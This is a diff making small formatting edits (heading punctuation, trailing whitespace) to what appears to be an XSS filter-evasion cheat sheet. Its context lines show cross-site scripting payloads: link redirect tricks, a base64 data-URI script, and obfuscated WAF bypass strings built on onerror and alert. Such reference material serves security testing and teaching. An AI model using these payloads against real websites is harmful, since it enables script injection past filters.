@@ -728,19 +728,19 @@ tt  p://6	6.000146.0x7.147/">XSS</A>
 
 `<A HREF="//www.google.com/">XSS</A>`
 
-#### Google "feeling lucky" part 1.
+#### Google "feeling lucky" part 1
 
 Firefox uses Google's "feeling lucky" function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox's `keyword:` protocol. You can concatenate several keywords by using something like the following `keyword:XSS+RSnake` for instance. This no longer works within Firefox as of 2.0.
 
 `<A HREF="//google">XSS</A>`
 
-#### Google "feeling lucky" part 2.
+#### Google "feeling lucky" part 2
 
 This uses a very tiny trick that appears to work Firefox only, because of it's implementation of the "feeling lucky" function. Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not. It's simply a malformed URL. If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera, and it is no longer supported in Firefox as of 2.0:
 
 `<A HREF="http://ha.ckers.org@google">XSS</A>`
 
-#### Google "feeling lucky" part 3.
+#### Google "feeling lucky" part 3
 
 This uses a malformed URL that appears to work in Firefox and Opera only, because of their implementation of the "feeling lucky" function. Like all of the above it requires that you are \#1 in Google for the keyword in question (in this case "google"):
 
@@ -756,7 +756,7 @@ Extra dot for absolute DNS:
 
 `<A HREF="http://www.google.com./">XSS</A>`
 
-#### JavaScript Link Location:
+#### JavaScript Link Location
 
 `<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>`
 
@@ -931,7 +931,7 @@ header('Refresh: 0; URL='.$_GET['param']);
 
 `/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`
 
-### WAF ByPass Strings for XSS.
+### WAF ByPass Strings for XSS
 
 - `<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">`
 - `<Video> <source onerror = "javascript: alert (XSS)">`
@@ -974,5 +974,5 @@ header('Refresh: 0; URL='.$_GET['param']);
 - `top[‘al\x65rt’](1)`
 - `top[8680439..toString(30)](1)`
 - `alert?.()`
-- &#96;`${alert``}`&#96; (The payload should include leading and trailing backticks.) 
+- &#96;`${alert``}`&#96; (The payload should include leading and trailing backticks.)
 - `(alert())`
